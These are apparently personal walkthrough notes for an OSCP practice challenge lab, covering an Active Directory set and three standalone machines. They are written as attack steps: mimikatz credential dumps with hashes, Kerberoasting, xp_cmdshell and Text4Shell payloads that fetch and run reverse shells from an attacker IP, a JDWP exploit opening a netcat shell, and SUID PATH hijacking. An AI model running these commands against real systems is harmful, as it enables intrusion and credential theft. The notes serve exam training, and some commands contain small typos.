# Preamble
This is the second of three dedicated OSCP Challenge Labs. It is composed of six six OSCP+ machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. All of the standalone machines have a local.txt and a proof.txt flag, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: Username: Eric.Wallows Password: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

# Active Directory
## MS01 - 192.168.157.147 / 10.10.118.147
### Initial Entry
- Use given credentials to login via ssh or Evil-WinRM:
	- Eric.Wallows:EricLikesRunning800
- Eric has SeImpersonatePrivilege, escalate with PrintSpoofer after downloading all required files e.g.:
	- Mimikatz
	- Ligolo Agent
	- SharpHound.ps1
	- powerview.ps1
### Privilege Escalation
- Use PrintSpoofer
	- `PS C:\Users\eric.wallows\Desktop> ./PrintSpoofer.exe -i -c "powershell -ep bypass"`

### Enumeration
- Look at C:\Users
	![[Pasted image 20250217130436.png]]
	- Found two more users:
		- celia.almeda
		- Mary.Williams
- Run SharpHound.ps1 and transfer file back over to Kali
	- `scp eric.wallows@192.168.158.147:C:/Users/eric.wallows/Desktop/<sharphound-zip-file> ./`
	![[Pasted image 20250217131931.png]]
	- Check users
	![[Pasted image 20250217132053.png]]
	- Two potential targets
	
- Run mimikatz
	- sekurlsa::logonpasswords
		![[Pasted image 20250217131421.png]]
		- Administrator:3c4495bbd678fac8c9d218be4f2bbc7b
		- Administrator:December31 (crackstation.net)
	- lsadump::sam
		![[Pasted image 20250217131528.png]]
		- Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e
		
		![[Pasted image 20250217131557.png]]
		- support:d9358122015c5b159574a88b3c0d2071
		- support:Freedom1 (crackstation.net)
- Further Enumeration with PowerShell & PowerView.ps1
	- UserList
		![[Pasted image 20250217132329.png]]
### Pivoting
- Setup ligolo proxy server & agent
	```shell
	# Setup Ligolo Proxy Server on Kali
	kali@kali:~$ linux_amd64-proxy -selfcert -laddr 0.0.0.0:443
	
	# Transfer and connect to Kali via Ligolo Agent Client
	C:\Users\eric.wallows\Desktop> .\agent.exe -connect 192.168.45.156:443 -ignore-cert
	
	# Setup session on Ligolo Proxy Server
	ligolo-ng>> session
	ligolo-ng>> ifconfig
	
	# Add internal subnet to Kali IP Route
	kali@kali:~$ sudo ip route add 10.10.118.0/24 dev ligolo
	
	# Start tunnel
	ligolo-ng>> start
	
	# Setup listeners for reverse shell & http server
	ligolo-ng>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 # revsh
	ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80 # http
	```
### Internal Server Enumeration
- Crackmapexec to check for WinRM paths from MS01
	- No paths
	- None of the hashes/passwords worked, need to find another angle
### Kerberoasting
- Use impacket-GetUserSPNs to identify and abuse some of the services
	![[Pasted image 20250217141421.png]]
	- sql_svc on MS02 looks interesting
	```shell
	# Kerberoasting using impacket-GetUserSPNs (Kali)
	kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.118.146 -outputfile hashes.kerberoast oscp.exam/eric.wallows
	
	# Crack the TGS-REP hash with hashcat
	kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	```
	- sql_svc:Dolphin1
	- web_svc:Diamond1
- Test credentials
	![[Pasted image 20250217141748.png]]
- If crackmapexec fails, use NetExec (NXE):
	![[Pasted image 20250217145408.png]]
## MS02 - 10.10.118.148
### Initial Access
- Use impacket-mssqlclient to connect to the MySQL db in MS02
	- `impacket-mssqlclient sql_svc:Dolphin@10.10.118.148 -windows-auth`
- Once in, we can use the built-in commands to download nc.exe and connect back to our Kali as a reverse shell
	```sql
	mysql> EXECUTE sp_configure 'show advanced options' 1;
	mysql> RECONFIGURE;
	mysql> EXECUTE sp_configure 'xp_cmdshell', 1;
	mysql> RECONFIGURE;
	mysql> EXECUTE xp_cmdshell 'powershell wget http://10.10.118.147:1234/nc.exe -outfile C:\Users\Public\nc.exe'
	mysql> EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe - e powershell 10.10.118.147 4444'
	# Remember to setup listening port on Kali
	```
### Initial Enumeration
- NT Service\MSSQL$SQLEXPRESS has SeImpersonatePrivilege --> PrintSpoofer
	![[Pasted image 20250217150829.png]]
### Privilege Escalation
- Transfer PrintSpoofer and run for elevated privileges
	![[Pasted image 20250217151400.png]]
### Further Enumeration
- Run mimikatz.exe
	![[Pasted image 20250217152553.png]]
	- Administrator:59b280ba707d22e3ef0aa587fc29ffe5
	![[Pasted image 20250217152643.png]]
	- Administrator:507e8b20766f720619e9f33d73756b34
- Extract SAM/SYSTEM hashes
	- `reg save HKLM\SAM SAM`
	- `reg save HKLM\SYSTEM SYSTEM`
	- Transfer to Kali via netcat
- There's a windows.old directory in C, Extract the SAM/SYSTEM hashes from there as well
### Cracking SAM Hashes
- Use impacket-secretsdump to crack hashes from the SAM and SYSTEM from the windows.old folder
	![[Pasted image 20250217153241.png]]
	- tom_admin:4979d69d4ca66955c075c41cf45f24dc

## DC01 - 10.10.118.146
### Initial Entry & Flag
- Evil-WinRM using tom_admin + NTLM hash
- proof.txt is in the Administrator Desktop
	![[Pasted image 20250217153442.png]]

# KIERO - 192.168.158.149
## Initial Scan
```c
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 12:58 +08
Nmap scan report for 192.168.158.149
Host is up (0.0059s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
## Enumeration 
- Initial scan didn't reveal much since:
	- vsftpd did not allow anonymous login
	- http server was default with no directories found
- Perform UDP Scan
	- `sudo nmap -F -sU -sV 192.168.158.149`
	- Found a UDP Port 161 Open - SNMPv1 server
	```c
	Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 16:51 +08
	Nmap scan report for 192.168.158.149
	Host is up (0.0059s latency).
	Not shown: 99 closed udp ports (port-unreach)
	PORT    STATE SERVICE VERSION
	161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
	Service Info: Host: oscp
	```
- SNMP Enumeration
	- snmpwalk doesn't work need to use:
	- `snmpbulkwalk -c public -v2c 192.168.232.149 .`
		![[Pasted image 20250217170923.png]]
		- Find these strings (idk how)
		- 2 users: john and kiero
		- default value?
## Initial Access
- Check where to use credentials via Hydra
	- username/password.txt = john, kiero
	- `hydra -L usernames.txt -P usernames.txt {ssh|ftp}://192.168.158.149 (-s 22)`
		![[Pasted image 20250217172435.png]]
- Connect to FTP
	- Found id_rsa, download it
		![[Pasted image 20250217172513.png]]
- Try to crack the id_rsa
	- No password, we can just use it
	- `chmod 600 id_rsa`
	- `ssh -i id_rsa {kiero|john}@192.168.158.149`
- Logged in as john
## Local Flag
- On john's home folder
	![[Pasted image 20250217172757.png]]
## Further Enumeration
- Transfer and run linpeas.sh
	- RESET_PASSWD in johns home directory is interesting
- Inspect RESET_PASSWD with strings
	![[Pasted image 20250217173742.png]]
- It calls upon chpasswd to change the password... and its a SUID binary...
	- Replace it? Can't.
	- Check PATH
- `echo $PATH` shows that we can't put it in anywhere higher
	- Add a path we can edit
	- `export PATH=/tmp:$PATH`
	- Now /tmp is the first place it will be looked for
- Put reverse shell inside that folder as chpasswd
## Privilege Escalation + Flag
- Run RESET_PASSWD
	- This will cause it to run our malicious chpasswd as root (because of the SUID flag)
	- Reverse shell as root
	- proof.txt is in /root
	![[Pasted image 20250217174649.png]]
# BERLIN - 192.168.158.150
## Initial Scan
```c
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 12:58 +08
Nmap scan report for 192.168.158.150
Host is up (0.0056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Spring Java Framework
```
## Initial Enumeration
- Enumerate the HTTP server, use GoBuster
	- Found /search, /CHANGELOG
	- CHANGELOG mentions that it added Apace Commons Text 1.8, check for vulns
- Found https://github.com/kljunowsky/CVE-2022-42889-text4shell
- Try the payloads
	- `${script:javascript:java.lang.Runtime.getRuntime().exec('INSERT-COMMAND-HERE')}`
	- Use the payload to download reverse shell, chmod +x the reverse shell, and run the reverse shell
	- Remember to URLEncode using http://urlencode.org
	```shell
	http://192.168.158.150:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('wget 192.168.45.156/reverse -O /tmp/reverse')}

	http://192.168.158.150:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('chmod +x /tmp/reverse')}

	http://192.168.158.150:8080/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('/tmp/reverse')}
	```
## Initial Access + Local Flag
- Logged in as the user `dev`
- local.txt in dev's home folder
	![[Pasted image 20250217181009.png]]
## Enumeration
- Transfer and run linpeas.sh
	- ???
- `ss -ntlpu` to check open ports
	- Open local port on 127.0.0.0:8000
- Transfer ligolo agent and setup ligolo tunnel
	```shell
	# Setting up new tunnel, since ligolo was used for AD
	kali@kali:~$ sudo ip tuntap add user $(whoami) mode tun ligolo2
	kali@kali:~$ sudo ip link set ligolo2 up

	# Start Ligolo Proxy Server on Kali
	kali@kali:~$ ./linux_amd64-proxy -selfcert -laddr 0.0.0.0:443

	# Connect to Proxy via Ligolo Agent on Victim
	dev@oscp:home/dev$ ./agent -connect 192.168.45.156:443 -ignore-cert
	
	# Start tunnel on Proxy Server
	ligolo>> session
	ligolo>> start

	# Add route to new tunnel
	kali@kali:~$ sudo ip route add 240.0.0.1/32 dev ligolo2
	```
- Scan the port to check whats running
	- `sudo nmap 240.0.0.1 -sV -p8000`
	- JDWP, Java Debug Wire Protocol version 11.0 11.0.16
- Find exploit: https://github.com/IOActive/jdwp-shellifier
	- Run with Python2
	- `python2 jdwp-shellifier.py -t 240.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.156 4444 -e /bin/bash"`
	- Reference: https://www.ddosi.org/oscp-cheat-sheet-2/#JDWP
	- Once waiting for prompt, use `nc -nv 192.168.158.150 5000` to trigger
## Privilege Escalation + Flag
- Get reverse shell as root via JDWP exploit
- Flag in /root
	![[Pasted image 20250217191803.png]]
# GUST - 192.168.158.151
## Initial Scan
```c
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 12:58 +08
Nmap scan report for 192.168.158.151
Host is up (0.0070s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2025-02-17T05:00:16+00:00
|_ssl-date: 2025-02-17T05:00:21+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2025-02-11T22:06:42
|_Not valid after:  2025-08-13T22:06:42
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```
## Initial Enumeration
- GoBuster on the HTTP site, nothing found
- Port 8021 looks interesting...
	- Look for exploits
	- https://www.exploit-db.com/exploits/47799
- Use the exploit to execute a PowerShell reverse shell
	- Refer to encode.py in [[13 Common Payloads]]
## Initial Entry + Local Flag
- Entered as chris
- local.txt in chris's Desktop
	![[Pasted image 20250217193834.png]]
## Privilege Escalation + Proof Flag
- Has SeImpersonatePrivilege
	- Import PrintSpoofer and escalate privileges
	![[Pasted image 20250217193755.png]]
	- Eh? It doesn't work
	- Try GodPotato:
		- `iwr -uri https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -Outfile GodPotato.exe`
		- `.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt`
- Intended method:
	 ![[Pasted image 20250217200139.png]]
	 ![[Pasted image 20250217200028.png]]
	- Find KiteService, we can create/modify files inside + start/stop services too
	- Replace KiteService.exe in C:\Program Files\Kite with reverse shell exe
- proof.txt in Administrator Desktop
	![[Pasted image 20250217200417.png]]